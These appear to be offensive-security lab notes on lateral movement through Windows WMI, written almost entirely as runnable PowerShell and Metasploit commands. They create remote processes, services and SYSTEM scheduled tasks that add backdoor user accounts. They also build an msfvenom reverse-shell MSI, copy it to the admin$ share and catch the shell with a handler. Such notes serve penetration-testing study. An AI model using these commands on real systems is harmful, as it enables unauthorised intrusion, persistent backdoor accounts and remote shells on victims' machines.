WMI is Windows implementation of Web-Based Enterprise Management (WBEM), an enterprise standard for accessing management information across devices. 

In simpler terms, WMI allows administrators to perform standard management tasks that attackers can abuse to perform lateral movement in various ways.<br>

**Connecting to WMI From Powershell**<br>

Before being able to connect to WMI using Powershell commands, we need to create a PSCredential object with our user and password.
This object will be stored in the $credential variable and utilised throughout the techniques on this task:
```
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```
There are two protocols when establishing a WMI session **DCOM** and **Wsman**.<br>
To establish a WMI session from Powershell, we can use the following commands and store the session on the $Session variable, which we will use directry.<br>
```
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

**Remote Process Creation Using WMI**<br>

We can remotely spawn a process from Powershell by leveraging WMI, sending a WMI request to the Win32_Process class to spawn the process under the session we created before:
```
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value lol";
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command}
```

**Creating Services Remotely with WMI**<br>

We can create services with WMI through Powershell. To create a service called LOLService, we can use the following command:
```
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "LOLService";
DisplayName = "LOLService";
PathName = "net user lol Pass123 /add"; # Your payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}
```
And then, we can get a handle on the service and start it with the following commands:

```
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'LOLservice'"
Invoke-CimMethod -InputObject $Service -MethodName StartService
```
Finally, we can stop and delete the service with the following commands:
```
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

**Creating Scheduled Tasks Remotely with WMI**<br>

We can create and execute scheduled tasks by using some cmdlets available in Windows default installations:
```
# Payload must be split in Command and Args
$Command = "cmd.exe"
$Args = "/c net user lol pass1234 /add"
$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "LOLservice"
Start-ScheduledTask -CimSession $Session -TaskName "LOLservice"
```
To delete the scheduled task after it has been used, we can use the following command:
```
Unregister-ScheduledTask -CimSession $Session -TaskName "LOLservice"
```

**Installing MSI packages through WMI**<br>

First wo should create an msi file using our msfvenom and copy it into the target machine using something like SMB.
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=4445 -f msi > lol.msi
```
```
smbclient //TargetName.DomainName.local/admin$ -U user1 -W <DomainName> -c 'put lol.msi'
```
*admin$* ->  is an administrative share on Windows machines, which provides remote access to the Windows directory (usually C:\Windows), it's a hidden share (denoted by the $) and is typically only accessible by users with administrative privileges.

Then We start a handler to receive the reverse shell from Metasploit:
```
msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST <ip>; set LPORT 4444;exploit"
```
MSI is a file format used for installers. If we can copy an MSI package to the target system, we can then use WMI to attempt to install it for us. The file can be copied in any way available to the attacker. Once the MSI file is in the target system, we can attempt to install it by invoking the *Win32_Product* class through WMI:
```
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\lol.msi"; Options = ""; AllUsers = $false}
```

